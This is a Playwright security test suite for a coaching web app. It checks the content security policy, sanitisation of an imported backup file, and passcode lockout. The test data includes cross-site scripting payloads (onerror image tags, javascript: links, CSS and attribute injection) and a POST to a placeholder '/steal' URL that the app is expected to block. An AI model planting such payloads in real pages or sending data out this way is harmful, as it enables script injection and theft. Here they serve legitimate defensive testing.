// Performance HQ end-to-end tests — security
// Run all suites with:  npm test   (see CLAUDE.md)
const { chromium, devices } = require('playwright');
const fs = require('fs');
const OUT = process.env.OUT_DIR || '.', BASE = process.env.BASE_URL || (process.env.BASE_URL || 'http://localhost:8080/');
const assert = (c, m) => { if (!c) throw new Error('ASSERT: ' + m); console.log('  ✓ ' + m); };
(async () => {
  const browser = await chromium.launch();
  const errors = [], csp = [];
  const ctx = await browser.newContext({ ...devices['iPhone 13'] });
  const p = await ctx.newPage();
  p.on('pageerror', e => errors.push(e.message));
  p.on('console', m => { if (m.type() === 'error' && !/Failed to load resource/.test(m.text())) (/Content Security Policy|Refused to/.test(m.text()) ? csp : errors).push(m.text()); });
  await p.goto(BASE); await p.waitForSelector('.modal'); await p.click('.modal-head [data-close]');
  console.log('== Browser security policy');
  const cspTag = await p.evaluate(() => document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content || '');
  assert(/script-src 'self' 'sha256-/.test(cspTag) && !/script-src[^;]*unsafe-inline/.test(cspTag), 'strict, hash-pinned script policy');
  assert(csp.length === 0, 'app runs with zero policy violations');
  await p.evaluate(() => { const d = document.createElement('div'); d.innerHTML = '<img src="x" onerror="window.__pwned=1">'; document.body.appendChild(d); const s = document.createElement('script'); s.textContent = 'window.__pwned=2'; document.body.appendChild(s); });
  await p.waitForTimeout(300);
  assert(await p.evaluate(() => window.__pwned === undefined), 'injected scripts and event handlers are blocked');
  const exfil = await p.evaluate(() => fetch('https://example.com/steal', { method: 'POST', body: 'x' }).then(() => 'sent', () => 'blocked'));
  assert(exfil === 'blocked', 'data cannot be sent to unknown websites');
  csp.length = 0;

  console.log('== Booby-trapped backup file');
  const X = '"><img src=x onerror="window.__pwned=3">';
  const evil = { app: 'performance-hq', data: {
    athletes: [
      { id: 'ok1', firstName: '<img src=x onerror="window.__pwned=4">Eve', lastName: X, color: 'red;"><img src=x onerror=window.__pwned=5>', sport: X, goals: '<script>window.__pwned=6</script>' },
      { id: 'bad" onmouseover="window.__pwned=7', firstName: 'Bad', lastName: 'Id' },
    ],
    events: [{ id: 'ev1', type: '"><img src=x onerror=window.__pwned=8>', status: X, date: new Date().toISOString().slice(0, 10), start: '09:00"><b', athleteIds: ['ok1', 'x" onclick="y'], title: X, notes: X }],
    tests: [{ id: 't1', athleteId: 'ok1', date: '2026-10-01', m: { cmj: 40, 'k"><img': 5, sj: 'abc' }, sides: { brakeAsym: X }, notes: X }],
    exercises: [{ id: 'e1', name: X, category: X, vbt: true, videoUrl: 'javascript:window.__pwned=9' }],
    workouts: [{ id: 'w1', athleteId: 'ok1', date: '2026-10-02', title: X, items: [{ id: 'i1" onclick="z', exerciseId: 'e1' }, { id: 'i2', exerciseId: 'e1', intensity: X, zone: X, notes: X }] }],
    notes: [{ id: 'n1', athleteId: 'ok1', date: '2026-10-02', text: X }],
    settings: { businessName: X, units: X, theme: X, brand: { primary: 'red;}body{display:none', logo: 'javascript:alert(1)' }, customMetrics: [{ key: 'c_ab"cd', label: X }, { key: 'c_good123', label: X, kind: X, dir: 5 }] },
    deleted: { 'x"y': 1 },
  } };
  fs.writeFileSync(OUT + '/evil.json', JSON.stringify(evil));
  await p.goto(BASE + '#/settings'); await p.waitForTimeout(200);
  await p.setInputFiles('#importFile', OUT + '/evil.json'); await p.waitForSelector('.dialog');
  await p.click('.dialog [data-i="1"]'); await p.waitForTimeout(200); await p.click('.dialog .btn.danger'); await p.waitForTimeout(600);
  const st = await p.evaluate(() => ({ ids: S.athletes.map(a => a.id), color: S.athletes[0].color, type: S.events[0].type, status: S.events[0].status, start: S.events[0].start, aIds: S.events[0].athleteIds, m: S.tests[0].m, items: S.workouts[0].items.map(i => i.id), cm: S.settings.customMetrics.map(c => c.key), logo: S.settings.brand.logo, theme: S.settings.theme, units: S.settings.units }));
  assert(st.ids.length === 1 && st.ids[0] === 'ok1', 'record with malicious id rejected');
  assert(st.color === '' && st.type === 'other' && st.status === 'scheduled' && st.start === '' && st.aIds.length === 1, 'colour, event type/status/time and references sanitised');
  assert(JSON.stringify(st.m) === '{"cmj":40}', 'test results keep only valid numbers');
  assert(st.items.length === 1 && st.cm.join() === 'c_good123' && st.logo === null && st.theme === 'auto' && st.units === 'imperial', 'workout items, custom tests, logo and settings sanitised');
  const aid = 'ok1';
  for (const r of ['dashboard', 'calendar', 'athletes', `athlete/${aid}`, `athlete/${aid}/evaluation`, `athlete/${aid}/testing`, `athlete/${aid}/program?d=2026-10-02`, `athlete/${aid}/vbt`, `athlete/${aid}/history`, 'library', 'leaderboard', 'leaderboard/records', 'reports', 'floor', 'fpai', 'settings', 'insights']) {
    await p.goto(BASE + '#/' + r); await p.waitForTimeout(150);
    await p.mouse.move(100, 300); await p.mouse.move(200, 400);
    await p.$$eval('[data-act]', els => els.slice(0, 3).forEach(e => e.dispatchEvent(new MouseEvent('mouseover', { bubbles: true }))));
  }
  await p.goto(BASE + '#/library'); await p.click('[data-act=editExercise]'); await p.waitForTimeout(200);
  assert(await p.locator('.modal a[href^="javascript"]').count() === 0, 'javascript: video links never rendered');
  await p.click('.modal-head [data-close]');
  await p.goto(BASE + `#/athletes`); await p.waitForTimeout(200);
  assert((await p.innerText('#view')).includes('<img src=x'), 'malicious names displayed as plain text');
  assert(await p.evaluate(() => window.__pwned === undefined), 'no injected code ran anywhere in the app');
  assert(csp.length === 0, 'no blocked-script attempts (nothing even tried to run)');

  console.log('== Passcode guessing');
  await p.evaluate(async () => { S = emptyState(); S.settings.onboarded = true; const salt = 'abc'; Object.assign(S.settings, { pinSalt: salt, pinHash: await hashPin('2468', salt), pinLen: 4, lockEnabled: true }); await flush(); });
  await p.reload(); await p.waitForTimeout(600);
  const tap = async code => { for (const k of code) await p.click(`#lock [data-k="${k}"]`); await p.waitForTimeout(250); };
  for (let i = 0; i < 5; i++) await tap('1111');
  assert((await p.innerText('#lockMsg')).includes('Too many attempts'), 'locked out after 5 wrong passcodes');
  await tap('2468');
  assert(await p.isVisible('#lock'), 'even the right passcode is refused during lock-out');
  await p.reload(); await p.waitForTimeout(600);
  assert((await p.innerText('#lockMsg')).includes('Too many attempts'), 'lock-out survives closing the app');
  await p.evaluate(async () => { lockFails.until = Date.now() - 1; await Store.set('lockFails', lockFails); });
  await tap('2468');
  assert(!(await p.isVisible('#lock')), 'correct passcode works after the wait');
  await browser.close();
  console.log(errors.length ? 'ERRORS:\n' + errors.join('\n') : 'ALL PASSED, NO CONSOLE ERRORS');
})().catch(e => { console.error(e.message); process.exit(1); });
